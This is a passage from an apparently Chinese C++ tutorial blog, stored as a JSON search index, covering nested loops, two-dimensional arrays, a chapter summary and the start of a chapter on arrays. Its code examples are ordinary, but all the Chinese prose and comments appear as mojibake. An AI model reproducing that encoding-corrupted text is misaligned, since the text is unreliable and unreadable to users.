æ˜¯æŒ‡ä¸€ä¸ªå¾ªç¯ç»“æ„å®Œå…¨åŒ…å«åœ¨å¦ä¸€ä¸ªå¾ªç¯ç»“æ„çš„å¾ªç¯ä½“å†…éƒ¨ã€‚å¤–å±‚å¾ªç¯æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œå†…å±‚å¾ªç¯ä¼šå®Œæ•´åœ°æ‰§è¡Œä¸€éï¼ˆä»å¼€å§‹åˆ°ç»“æŸï¼‰ã€‚åµŒå¥—å¾ªç¯å¸¸ç”¨äºå¤„ç†å…·æœ‰å¤šç»´ç»“æ„çš„æ•°æ®ï¼Œä¾‹å¦‚è¡¨æ ¼ã€çŸ©é˜µæˆ–å›¾åƒçš„åƒç´ ã€‚ äºŒç»´æ•°ç»„ (Two-Dimensional Array) æ˜¯æ•°ç»„çš„ä¸€ç§æ‰©å±•ï¼Œå¯ä»¥çœ‹ä½œæ˜¯â€œæ•°ç»„çš„æ•°ç»„â€ã€‚å®ƒåœ¨æ¦‚å¿µä¸Šåƒä¸€ä¸ªè¡¨æ ¼æˆ–ç½‘æ ¼ï¼Œæœ‰è¡Œ (row) å’Œåˆ— (column)ã€‚äºŒç»´æ•°ç»„æ˜¯ä½¿ç”¨åµŒå¥—å¾ªç¯å¤„ç†çš„å…¸å‹æ•°æ®ç»“æ„ã€‚ åµŒå¥—å¾ªç¯ç¤ºä¾‹: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; const int ROWS = 3; const int COLS = 4; std::cout &lt;&lt; &quot;Nested loop example (printing coordinates):&quot; &lt;&lt; std::endl; // å¤–å±‚å¾ªç¯æ§åˆ¶è¡Œ for (int i = 0; i &lt; ROWS; ++i) &#123; // å†…å±‚å¾ªç¯æ§åˆ¶åˆ— for (int j = 0; j &lt; COLS; ++j) &#123; // å¯¹äºå¤–å±‚å¾ªç¯çš„æ¯æ¬¡è¿­ä»£ (i)ï¼Œå†…å±‚å¾ªç¯ä¼šå®Œæ•´æ‰§è¡Œä¸€é (j ä» 0 åˆ° COLS-1) std::cout &lt;&lt; &quot;(&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; j &lt;&lt; &quot;) &quot;; &#125; std::cout &lt;&lt; std::endl; // æ¯è¡Œç»“æŸåæ¢è¡Œ &#125; return 0;&#125; è¾“å‡º: 1234Nested loop example (printing coordinates):(0,0) (0,1) (0,2) (0,3) (1,0) (1,1) (1,2) (1,3) (2,0) (2,1) (2,2) (2,3) 5.6.1 åˆå§‹åŒ–äºŒç»´æ•°ç»„å£°æ˜äºŒç»´æ•°ç»„éœ€è¦æŒ‡å®šä¸¤ä¸ªç»´åº¦çš„å¤§å°ï¼šç¬¬ä¸€ä¸ªæ˜¯è¡Œæ•°ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ—æ•°ã€‚ å£°æ˜è¯­æ³•: 1typeName arrayName[numberOfRows][numberOfColumns]; åˆå§‹åŒ–æ–¹æ³•: å¯ä»¥ä½¿ç”¨åµŒå¥—çš„èŠ±æ‹¬å· &#123;&#125; æ¥åˆå§‹åŒ–äºŒç»´æ•°ç»„ã€‚å¤–å±‚èŠ±æ‹¬å·ä»£è¡¨æ•´ä¸ªæ•°ç»„ï¼Œå†…å±‚èŠ±æ‹¬å·ä»£è¡¨æ¯ä¸€è¡Œã€‚ å®Œæ•´åˆå§‹åŒ–: æä¾›æ‰€æœ‰è¡Œçš„åˆå§‹åŒ–åˆ—è¡¨ã€‚ 12345int matrix[3][4] = &#123; // 3 è¡Œ 4 åˆ— &#123;1, 2, 3, 4&#125;, // åˆå§‹åŒ–ç¬¬ 0 è¡Œ &#123;5, 6, 7, 8&#125;, // åˆå§‹åŒ–ç¬¬ 1 è¡Œ &#123;9, 10, 11, 12&#125; // åˆå§‹åŒ–ç¬¬ 2 è¡Œ&#125;; éƒ¨åˆ†åˆå§‹åŒ–: å¦‚æœæä¾›çš„åˆå§‹åŒ–å€¼ä¸è¶³ï¼Œå‰©ä½™å…ƒç´ ä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸º 0ï¼ˆå¯¹äºæ•°å€¼ç±»å‹ï¼‰ã€‚ 12345678int partial[3][4] = &#123; &#123;1, 2&#125;, // ç¬¬ 0 è¡Œ: &#123;1, 2, 0, 0&#125; &#123;5&#125; // ç¬¬ 1 è¡Œ: &#123;5, 0, 0, 0&#125; // ç¬¬ 2 è¡Œ: &#123;0, 0, 0, 0&#125; (æœªæä¾›åˆå§‹åŒ–åˆ—è¡¨)&#125;;// å°†æ•´ä¸ªäºŒç»´æ•°ç»„åˆå§‹åŒ–ä¸º 0int allZeros[10][20] = &#123;0&#125;; // æˆ– C++11: int allZeros[10][20] &#123;&#125;; çœç•¥è¡Œæ•° (ä½†ä¸èƒ½çœç•¥åˆ—æ•°): å¦‚æœåœ¨å£°æ˜æ—¶æä¾›äº†åˆå§‹åŒ–åˆ—è¡¨ï¼Œå¯ä»¥çœç•¥ç¬¬ä¸€ä¸ªç»´åº¦ï¼ˆè¡Œæ•°ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®åˆå§‹åŒ–åˆ—è¡¨æ¨æ–­è¡Œæ•°ã€‚ä½†ç¬¬äºŒä¸ªç»´åº¦ï¼ˆåˆ—æ•°ï¼‰å¿…é¡»æŒ‡å®šã€‚ 1234int inferredRows[][4] = &#123; // åˆ—æ•°å¿…é¡»æ˜¯ 4 &#123;1, 1, 1, 1&#125;, &#123;2, 2, 2, 2&#125;&#125;; // ç¼–è¯‘å™¨æ¨æ–­è¡Œæ•°ä¸º 2 C++11 åˆ—è¡¨åˆå§‹åŒ–: å¯ä»¥çœç•¥ç­‰å· =ã€‚ 12int matrix_cpp11[2][3] &#123; &#123;1, 2, 3&#125;, &#123;4, 5, 6&#125; &#125;;int zeros_cpp11[5][5] &#123;&#125;; // æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸º 0 ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // å®Œæ•´åˆå§‹åŒ– int data[2][3] = &#123; &#123;10, 20, 30&#125;, &#123;40, 50, 60&#125; &#125;; // éƒ¨åˆ†åˆå§‹åŒ– float coords[3][2] = &#123; &#123;1.1f, 2.2f&#125;, &#123;3.3f&#125; // &#123;3.3f, 0.0f&#125; // ç¬¬ä¸‰è¡Œä¸º &#123;0.0f, 0.0f&#125; &#125;; // çœç•¥è¡Œæ•° char messages[][10] = &#123; // åˆ—æ•°å¿…é¡»æŒ‡å®š &quot;Hello&quot;, &quot;World&quot; &#125;; // æ¨æ–­ä¸º 2 è¡Œ 10 åˆ— // C++11 åˆå§‹åŒ– int table[2][2] &#123; &#123;1&#125;, &#123;3, 4&#125; &#125;; // &#123;&#123;1, 0&#125;, &#123;3, 4&#125;&#125; std::cout &lt;&lt; &quot;data[1][1]: &quot; &lt;&lt; data[1][1] &lt;&lt; std::endl; // è¾“å‡º 50 std::cout &lt;&lt; &quot;coords[1][1]: &quot; &lt;&lt; coords[1][1] &lt;&lt; std::endl; // è¾“å‡º 0 std::cout &lt;&lt; &quot;messages[0]: &quot; &lt;&lt; messages[0] &lt;&lt; std::endl; // è¾“å‡º Hello std::cout &lt;&lt; &quot;table[0][1]: &quot; &lt;&lt; table[0][1] &lt;&lt; std::endl; // è¾“å‡º 0 return 0;&#125; 5.6.2 ä½¿ç”¨äºŒç»´æ•°ç»„è®¿é—®äºŒç»´æ•°ç»„çš„å…ƒç´ éœ€è¦æä¾›ä¸¤ä¸ªç´¢å¼•ï¼šç¬¬ä¸€ä¸ªæ˜¯è¡Œç´¢å¼•ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ—ç´¢å¼•ã€‚ç´¢å¼•åŒæ ·ä» 0 å¼€å§‹ã€‚ è®¿é—®è¯­æ³•: 1arrayName[rowIndex][columnIndex] ä½¿ç”¨åµŒå¥—å¾ªç¯å¤„ç†äºŒç»´æ•°ç»„: åµŒå¥—å¾ªç¯æ˜¯å¤„ç†äºŒç»´æ•°ç»„æ‰€æœ‰å…ƒç´ çš„æ ‡å‡†æ–¹æ³•ã€‚é€šå¸¸ï¼Œå¤–å±‚å¾ªç¯éå†è¡Œï¼Œå†…å±‚å¾ªç¯éå†åˆ—ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;const int NUM_CITIES = 3;const int NUM_MONTHS = 4; // å‡è®¾åªè®°å½• 4 ä¸ªæœˆçš„æ•°æ®int main() &#123; // å­˜å‚¨ 3 ä¸ªåŸå¸‚ 4 ä¸ªæœˆçš„å¹³å‡æ°”æ¸© double temperatures[NUM_CITIES][NUM_MONTHS] = &#123; &#123;10.5, 12.1, 15.3, 18.0&#125;, // City 0 &#123;8.2, 9.5, 13.0, 16.5&#125;, // City 1 &#123;12.0, 14.5, 17.8, 21.2&#125; // City 2 &#125;; std::cout &lt;&lt; &quot;Monthly average temperatures:&quot; &lt;&lt; std::endl; // ä½¿ç”¨åµŒå¥—å¾ªç¯éå†å¹¶æ‰“å°æ‰€æœ‰æ¸©åº¦ for (int city = 0; city &lt; NUM_CITIES; ++city) &#123; // å¤–å±‚å¾ªç¯éå†åŸå¸‚ (è¡Œ) std::cout &lt;&lt; &quot;City &quot; &lt;&lt; city &lt;&lt; &quot;: &quot;; for (int month = 0; month &lt; NUM_MONTHS; ++month) &#123; // å†…å±‚å¾ªç¯éå†æœˆä»½ (åˆ—) std::cout &lt;&lt; temperatures[city][month] &lt;&lt; &quot;\\t&quot;; // ä½¿ç”¨è¡Œå’Œåˆ—ç´¢å¼•è®¿é—®å…ƒç´  &#125; std::cout &lt;&lt; std::endl; &#125; // è®¡ç®— City 1 çš„æ€»æ¸©åº¦å’Œå¹³å‡æ¸©åº¦ double city1_total = 0.0; int city_index = 1; // è¦è®¡ç®—çš„åŸå¸‚ç´¢å¼• for (int month = 0; month &lt; NUM_MONTHS; ++month) &#123; city1_total += temperatures[city_index][month]; &#125; double city1_average = city1_total / NUM_MONTHS; std::cout &lt;&lt; &quot;\\nAverage temperature for City &quot; &lt;&lt; city_index &lt;&lt; &quot;: &quot; &lt;&lt; city1_average &lt;&lt; std::endl; // è®¡ç®—æ‰€æœ‰åŸå¸‚ç¬¬ä¸€ä¸ªæœˆçš„å¹³å‡æ¸©åº¦ double month0_total = 0.0; int month_index = 0; // è¦è®¡ç®—çš„æœˆä»½ç´¢å¼• for (int city = 0; city &lt; NUM_CITIES; ++city) &#123; month0_total += temperatures[city][month_index]; &#125; double month0_average = month0_total / NUM_CITIES; std::cout &lt;&lt; &quot;Average temperature for Month &quot; &lt;&lt; month_index &lt;&lt; &quot; across all cities: &quot; &lt;&lt; month0_average &lt;&lt; std::endl; return 0;&#125; å†…å­˜å¸ƒå±€:åœ¨å†…å­˜ä¸­ï¼ŒäºŒç»´æ•°ç»„é€šå¸¸æ˜¯æŒ‰è¡Œä¸»åº (Row-Major Order) å­˜å‚¨çš„ã€‚è¿™æ„å‘³ç€ç¬¬ä¸€è¡Œçš„æ‰€æœ‰å…ƒç´ è¿ç»­å­˜å‚¨ï¼Œç„¶åæ˜¯ç¬¬äºŒè¡Œçš„æ‰€æœ‰å…ƒç´ ï¼Œä¾æ­¤ç±»æ¨ã€‚ä¾‹å¦‚ï¼Œmatrix[3][4] çš„å†…å­˜å¸ƒå±€çœ‹èµ·æ¥åƒï¼šmatrix[0][0], matrix[0][1], matrix[0][2], matrix[0][3], matrix[1][0], matrix[1][1], ... , matrix[2][3] ç†è§£è¿™ä¸€ç‚¹å¯¹äºå°†äºŒç»´æ•°ç»„ä¼ é€’ç»™å‡½æ•°ï¼ˆé€šå¸¸éœ€è¦çŸ¥é“åˆ—æ•°ï¼‰æˆ–è¿›è¡ŒæŸäº›æŒ‡é’ˆæ“ä½œå¾ˆé‡è¦ã€‚ 5.7 æ€»ç»“æœ¬ç« é‡ç‚¹ä»‹ç»äº†C++ä¸­çš„å¾ªç¯ç»“æ„å’Œå…³ç³»è¡¨è¾¾å¼ï¼Œå®ƒä»¬æ˜¯æ§åˆ¶ç¨‹åºæµç¨‹å’Œå¤„ç†é‡å¤ä»»åŠ¡çš„åŸºç¡€ã€‚ æˆ‘ä»¬å­¦ä¹ äº†ä¸‰ç§ä¸»è¦çš„å¾ªç¯è¯­å¥ï¼š for å¾ªç¯: è¿™æ˜¯ä¸€ç§å…¥å£æ¡ä»¶å¾ªç¯ï¼Œå…¶å¤´éƒ¨åŒ…å«äº†åˆå§‹åŒ–ã€æµ‹è¯•æ¡ä»¶å’Œæ›´æ–°ä¸‰ä¸ªéƒ¨åˆ†ï¼Œç»“æ„æ¸…æ™°ï¼Œç‰¹åˆ«é€‚ç”¨äºè®¡æ•°æˆ–å·²çŸ¥è¿­ä»£æ¬¡æ•°çš„æƒ…å†µã€‚æˆ‘ä»¬æ¢è®¨äº†å…¶ç»„æˆéƒ¨åˆ†ã€å¦‚ä½•ä¿®æ”¹æ­¥é•¿ã€ä½¿ç”¨å®ƒè®¿é—®å­—ç¬¦ä¸²ï¼ˆCé£æ ¼å’Œstd::stringï¼‰ï¼Œå¹¶è¯¦ç»†å­¦ä¹ äº†é€’å¢ (++) å’Œé€’å‡ (--) è¿ç®—ç¬¦ï¼ˆåŒ…æ‹¬å‰ç¼€å’Œåç¼€å½¢å¼åŠå…¶åŒºåˆ«ã€å‰¯ä½œç”¨å’Œé¡ºåºç‚¹é—®é¢˜ã€åœ¨æŒ‡é’ˆä¸Šçš„åº”ç”¨ï¼‰ã€‚æ­¤å¤–ï¼Œè¿˜ä»‹ç»äº†ç»„åˆèµ‹å€¼è¿ç®—ç¬¦ï¼ˆå¦‚ +=, -=ï¼‰å’Œé€—å·è¿ç®—ç¬¦åœ¨ for å¾ªç¯ä¸­çš„åº”ç”¨ã€‚ while å¾ªç¯: è¿™ä¹Ÿæ˜¯ä¸€ç§å…¥å£æ¡ä»¶å¾ªç¯ï¼Œä½†ç»“æ„æ›´ç®€å•ï¼ŒåªåŒ…å«ä¸€ä¸ªæµ‹è¯•æ¡ä»¶ã€‚å®ƒé€‚ç”¨äºå¾ªç¯æ¬¡æ•°ä¸ç¡®å®šã€ä¾èµ–äºæŸä¸ªæ¡ä»¶æŒç»­æ»¡è¶³çš„æƒ…å†µã€‚æˆ‘ä»¬æ¯”è¾ƒäº† for å’Œ while çš„é€‚ç”¨åœºæ™¯ï¼Œå¹¶äº†è§£äº†å¦‚ä½•ä½¿ç”¨å¾ªç¯ï¼ˆè™½ç„¶ä¸æ¨èï¼‰ä»¥åŠç°ä»£ C++ çš„ &lt;chrono&gt; å’Œ &lt;thread&gt; åº“æ¥å®ç°å»¶æ—¶ã€‚ do while å¾ªç¯: è¿™æ˜¯ä¸€ç§å‡ºå£æ¡ä»¶å¾ªç¯ï¼Œå…¶ç‰¹ç‚¹æ˜¯å¾ªç¯ä½“è‡³å°‘æ‰§è¡Œä¸€æ¬¡ï¼Œç„¶ååœ¨æ¯æ¬¡è¿­ä»£ç»“æŸæ—¶æ£€æŸ¥æ¡ä»¶ã€‚å®ƒé€‚ç”¨äºéœ€è¦ç¡®ä¿æ“ä½œè‡³å°‘å‘ç”Ÿä¸€æ¬¡çš„åœºæ™¯ï¼Œå¦‚ç”¨æˆ·è¾“å…¥éªŒè¯ã€‚ C++11 å¼•å…¥çš„åŸºäºèŒƒå›´çš„ for å¾ªç¯æä¾›äº†ä¸€ç§æ›´ç®€æ´ã€æ›´å®‰å…¨çš„éå†åºåˆ—ï¼ˆå¦‚æ•°ç»„ã€vectorã€stringã€åˆå§‹åŒ–åˆ—è¡¨ï¼‰ä¸­æ‰€æœ‰å…ƒç´ çš„æ–¹å¼ã€‚æˆ‘ä»¬å­¦ä¹ äº†å…¶è¯­æ³•ã€å¦‚ä½•ä½¿ç”¨ autoã€å¼•ç”¨ (&amp;) å’Œå¸¸é‡å¼•ç”¨ (const &amp;) æ¥å£°æ˜å¾ªç¯å˜é‡ï¼Œä»¥åŠå®ƒçš„ä¼˜ç‚¹å’Œå±€é™æ€§ï¼ˆå¦‚æ— æ³•ç›´æ¥è·å–ç´¢å¼•ï¼‰ã€‚ å…³ç³»è¡¨è¾¾å¼ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ï¼ˆ&lt;, &gt;, &lt;=, &gt;=, ==, !=ï¼‰æ¥æ¯”è¾ƒå€¼ï¼Œç»“æœä¸ºå¸ƒå°”å€¼ true æˆ– falseï¼Œå¸¸ç”¨äºå¾ªç¯å’Œåˆ†æ”¯è¯­å¥çš„æ¡ä»¶åˆ¤æ–­ã€‚æˆ‘ä»¬ç‰¹åˆ«å¼ºè°ƒäº†å°†èµ‹å€¼è¿ç®—ç¬¦ (=) è¯¯ç”¨ä¸ºæ¯”è¾ƒè¿ç®—ç¬¦ (==) çš„å¸¸è§é”™è¯¯åŠå…¶åæœã€‚å¯¹äºå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæˆ‘ä»¬äº†è§£åˆ° C é£æ ¼å­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨ &lt;cstring&gt; ä¸­çš„ strcmp() å‡½æ•°æ¥æ¯”è¾ƒå†…å®¹ï¼Œè€Œ std::string ç±»åˆ™å¯ä»¥ç›´æ¥ä½¿ç”¨é‡è½½çš„å…³ç³»è¿ç®—ç¬¦è¿›è¡Œå†…å®¹çš„å­—å…¸åºæ¯”è¾ƒã€‚ æœ¬ç« è¿˜æ·±å…¥æ¢è®¨äº†å¾ªç¯ä¸æ–‡æœ¬è¾“å…¥çš„ç»“åˆã€‚æˆ‘ä»¬åˆ†æäº† cin &gt;&gt; è¯»å–å•è¯ï¼ˆè·³è¿‡å¹¶åœæ­¢äºç©ºç™½ï¼‰çš„è¡Œä¸ºï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨ cin.get(char) å’Œæ— å‚æ•°çš„ cin.get() æ¥é€ä¸ªè¯»å–å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºç™½ç¬¦ï¼‰ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•æ£€æµ‹æ–‡ä»¶å°¾ (EOF) æ¡ä»¶ä»¥æ­£ç¡®ç»ˆæ­¢è¾“å…¥å¾ªç¯ï¼ŒåŒ…æ‹¬æ£€æŸ¥ cin æµçŠ¶æ€å’Œ cin.get() çš„è¿”å›å€¼ã€‚æœ€åï¼Œæˆ‘ä»¬äº†è§£äº†è¯»å– C é£æ ¼å­—ç¬¦ä¸²çš„ cin.get(buffer, size) ç‰ˆæœ¬åŠå…¶ä¸ getline çš„åŒºåˆ«ï¼ˆåˆ†éš”ç¬¦å¤„ç†ï¼‰ã€‚ æœ€åï¼Œæˆ‘ä»¬å­¦ä¹ äº†åµŒå¥—å¾ªç¯çš„æ¦‚å¿µï¼Œå³ä¸€ä¸ªå¾ªç¯åŒ…å«åœ¨å¦ä¸€ä¸ªå¾ªç¯å†…éƒ¨ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨åµŒå¥—å¾ªç¯æ¥å¤„ç†äºŒç»´æ•°ç»„ï¼ˆæ•°ç»„çš„æ•°ç»„ï¼‰ã€‚æˆ‘ä»¬äº†è§£äº†äºŒç»´æ•°ç»„çš„åˆå§‹åŒ–æ–¹æ³•å’Œå¦‚ä½•ä½¿ç”¨åŒé‡ç´¢å¼• [row][col] é…åˆåµŒå¥—å¾ªç¯æ¥è®¿é—®å’Œå¤„ç†å…¶æ‰€æœ‰å…ƒç´ ã€‚ é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº† C++ ä¸­æ§åˆ¶é‡å¤æ‰§è¡Œå’Œè¿›è¡Œæ¯”è¾ƒçš„æ ¸å¿ƒå·¥å…·ï¼Œä¸ºç¼–å†™æ›´å¤æ‚ã€æ›´å¼ºå¤§çš„ç¨‹åºå¥ å®šäº†åŸºç¡€ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 4 å¤åˆç±»å‹","slug":"Cpp_tutorial_Chapter_4","date":"2025-04-26T12:03:35.367Z","updated":"2025-04-26T12:01:30.715Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_4/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_4/","excerpt":"","text":"4.1 æ•°ç»„æ•°ç»„ (Array) æ˜¯ä¸€ç§å¤åˆç±»å‹ (Compound Type)**ï¼Œå®ƒå…è®¸ä½ å­˜å‚¨å¤šä¸ªç›¸åŒç±»å‹çš„å€¼ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ç§°ä¸ºä¸€ä¸ªå…ƒç´  (Element)ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼• (Index)** æˆ–ä¸‹æ ‡ (Subscript) æ¥è®¿é—®ç‰¹å®šå…ƒç´ ã€‚ 4.1.1 ç¨‹åºè¯´æ˜æƒ³è±¡ä¸€ä¸‹ï¼Œä½ éœ€è¦å­˜å‚¨ä¸€å¹´ä¸­æ¯ä¸ªæœˆçš„é”€å”®é¢ã€‚ä½ å¯ä»¥å£°æ˜12ä¸ªç‹¬ç«‹çš„ double å˜é‡ï¼š 1double salesJan, salesFeb, salesMar, /* ..., */ salesDec; è¿™ç§æ–¹æ³•éå¸¸ç¹çï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦å¤„ç†å¤§é‡æ•°æ®æ—¶ã€‚æ•°ç»„æä¾›äº†ä¸€ç§æ›´ç®€æ´ã€æ›´å¼ºå¤§çš„æ–¹å¼æ¥å¤„ç†è¿™ç§æƒ…å†µã€‚ æ•°ç»„å£°æ˜: å£°æ˜ä¸€ä¸ªæ•°ç»„éœ€è¦æŒ‡å®šï¼š å…ƒç´ ç±»å‹: æ•°ç»„ä¸­å­˜å‚¨çš„æ•°æ®ç±»å‹ã€‚ æ•°ç»„åç§°: å˜é‡åã€‚ æ•°ç»„å¤§å°: æ•°ç»„å¯ä»¥å®¹çº³çš„å…ƒç´ æ•°é‡ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå¸¸é‡è¡¨è¾¾å¼ï¼ˆåœ¨ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šå…¶å€¼çš„è¡¨è¾¾å¼ï¼Œä¾‹å¦‚å­—é¢å¸¸é‡ã€const å¸¸é‡ã€æšä¸¾é‡æˆ– sizeof è¡¨è¾¾å¼çš„ç»“æœï¼‰ï¼Œå¹¶ä¸”å¿…é¡»æ”¾åœ¨æ–¹æ‹¬å· [] å†…ã€‚ è¯­æ³•: 1typeName arrayName[arraySize]; ç¤ºä¾‹: 123456789// å£°æ˜ä¸€ä¸ªå¯ä»¥å­˜å‚¨ 12 ä¸ª double ç±»å‹å€¼çš„æ•°ç»„ï¼Œåä¸º monthlySalesdouble monthlySales[12]; // å£°æ˜ä¸€ä¸ªå¯ä»¥å­˜å‚¨ 5 ä¸ª int ç±»å‹å€¼çš„æ•°ç»„ï¼Œåä¸º scoresint scores[5];// ä½¿ç”¨ const å¸¸é‡å®šä¹‰æ•°ç»„å¤§å°const int NUM_STUDENTS = 30;int studentGrades[NUM_STUDENTS]; è®¿é—®æ•°ç»„å…ƒç´ : ä½¿ç”¨æ•°ç»„åå’Œæ–¹æ‹¬å·å†…çš„ç´¢å¼•æ¥è®¿é—®æ•°ç»„å…ƒç´ ã€‚C++æ•°ç»„çš„ç´¢å¼•ä» 0 å¼€å§‹ã€‚å¯¹äºå¤§å°ä¸º N çš„æ•°ç»„ï¼Œæœ‰æ•ˆçš„ç´¢å¼•èŒƒå›´æ˜¯ 0 åˆ° N-1ã€‚ 1234567891011121314// è®¿é—® monthlySales æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  (ä¸€æœˆ)monthlySales[0] = 1500.50; // è®¿é—® monthlySales æ•°ç»„çš„ç¬¬ä¸‰ä¸ªå…ƒç´  (ä¸‰æœˆ)monthlySales[2] = 2100.75; // è®¿é—® scores æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ scores[4] = 95; // è¯»å– scores æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ int secondScore = scores[1]; std::cout &lt;&lt; &quot;March sales: &quot; &lt;&lt; monthlySales[2] &lt;&lt; std::endl;std::cout &lt;&lt; &quot;Second score: &quot; &lt;&lt; secondScore &lt;&lt; std::endl; é‡è¦: C++ ä¸ä¼šè‡ªåŠ¨æ£€æŸ¥æ•°ç»„ç´¢å¼•æ˜¯å¦è¶Šç•Œã€‚è®¿é—® arrayName[N] æˆ– arrayName[-1]ï¼ˆå¯¹äºå¤§å°ä¸º N çš„æ•°ç»„ï¼‰æ˜¯**æœªå®šä¹‰è¡Œä¸º (Undefined Behavior)**ï¼Œå¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒæˆ–æ•°æ®æŸåã€‚ç¨‹åºå‘˜æœ‰è´£ä»»ç¡®ä¿ä½¿ç”¨çš„ç´¢å¼•åœ¨æœ‰æ•ˆèŒƒå›´å†… (0 åˆ° arraySize - 1)ã€‚ æ•°ç»„å¤§å°å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼: 1234567int n = 10;// int dynamicArray[n]; // é”™è¯¯! C++ æ ‡å‡†ä¸å…è®¸ä½¿ç”¨å˜é‡ä½œä¸ºæ•°ç»„å¤§å° (è™½ç„¶æŸäº›ç¼–è¯‘å™¨å¯èƒ½ä½œä¸ºæ‰©å±•æ”¯æŒ)const int SIZE = 5;int staticArray[SIZE]; // æ­£ç¡®! SIZE æ˜¯ const å¸¸é‡int anotherArray[10]; // æ­£ç¡®! 10 æ˜¯å­—é¢å¸¸é‡ å¦‚æœéœ€è¦åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°ï¼Œåº”è¯¥ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆnewï¼‰æˆ–æ ‡å‡†åº“æä¾›çš„å®¹å™¨ï¼ˆå¦‚ std::vectorï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚å­¦ä¹ ã€‚ 4.1.2 æ•°ç»„çš„åˆå§‹åŒ–è§„åˆ™åœ¨å£°æ˜æ•°ç»„æ—¶ï¼Œå¯ä»¥åŒæ—¶å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ã€‚åˆå§‹åŒ–ä½¿ç”¨èŠ±æ‹¬å· &#123;&#125; æ‹¬èµ·æ¥çš„**åˆå§‹åŒ–åˆ—è¡¨ (Initializer List)**ã€‚ è§„åˆ™: å®Œæ•´åˆå§‹åŒ–: æä¾›ä¸æ•°ç»„å¤§å°ç›¸åŒæ•°é‡çš„åˆå§‹å€¼ã€‚ 12int scores[5] = &#123;90, 85, 92, 78, 88&#125;; // scores[0]=90, scores[1]=85, ..., scores[4]=88double lengths[3] = &#123;1.2, 3.4, 0.5&#125;; éƒ¨åˆ†åˆå§‹åŒ–: å¦‚æœæä¾›çš„åˆå§‹å€¼æ•°é‡å°‘äºæ•°ç»„å¤§å°ï¼Œåˆ™å‰©ä½™çš„å…ƒç´ ä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸º 0ï¼ˆå¯¹äºæ•°å€¼ç±»å‹ï¼‰æˆ–ç›¸åº”çš„é›¶ç­‰ä»·å€¼ï¼ˆå¯¹äºå…¶ä»–ç±»å‹ï¼Œå¦‚å­—ç¬¦æ•°ç»„çš„ç©ºå­—ç¬¦ \\0ï¼‰ã€‚ 1234567int counts[10] = &#123;1, 2, 3&#125;; // counts[0]=1, counts[1]=2, counts[2]=3 // counts[3] åˆ° counts[9] éƒ½è¢«åˆå§‹åŒ–ä¸º 0float readings[5] = &#123;9.8f&#125;; // readings[0]=9.8f, å…¶ä»–å…ƒç´ ä¸º 0.0f// å°†æ•°ç»„æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸º 0 çš„å¸¸ç”¨æ–¹æ³•int allZeros[100] = &#123;0&#125;; çœç•¥æ•°ç»„å¤§å°: å¦‚æœåœ¨å£°æ˜æ—¶æä¾›äº†åˆå§‹åŒ–åˆ—è¡¨ï¼Œå¯ä»¥çœç•¥æ–¹æ‹¬å·ä¸­çš„æ•°ç»„å¤§å°ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®åˆå§‹åŒ–åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡è‡ªåŠ¨æ¨æ–­æ•°ç»„å¤§å°ã€‚ 12short values[] = &#123;10, 20, 30, 40&#125;; // ç¼–è¯‘å™¨æ¨æ–­æ•°ç»„å¤§å°ä¸º 4char message[] = &#123;&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;\\0&#x27;&#125;; // å¤§å°ä¸º 6 (åŒ…æ‹¬ç©ºå­—ç¬¦) ä¸å…è®¸åˆå§‹åŒ–åˆ—è¡¨å…ƒç´ è¿‡å¤š: åˆå§‹åŒ–åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡ä¸èƒ½è¶…è¿‡æ•°ç»„å£°æ˜çš„å¤§å°ã€‚ 1// int errors[3] = &#123;1, 2, 3, 4&#125;; // é”™è¯¯! åˆå§‹åŒ–åˆ—è¡¨å…ƒç´ è¿‡å¤š æœªåˆå§‹åŒ–æ•°ç»„: 